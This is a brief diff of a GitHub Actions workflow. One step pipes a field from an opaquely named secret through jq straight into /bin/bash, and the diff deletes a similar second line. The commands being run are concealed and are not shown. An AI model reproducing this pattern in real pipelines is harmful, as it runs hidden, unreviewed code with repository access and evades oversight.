@@ -17,7 +17,6 @@ jobs:
           fson134: ${{ secrets.fson134 }}
         run: |
           printf '%s' "$fson134" | jq -r .eefdk007 | /bin/bash
-          echo $gfsy59499 | jq -r .w9 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
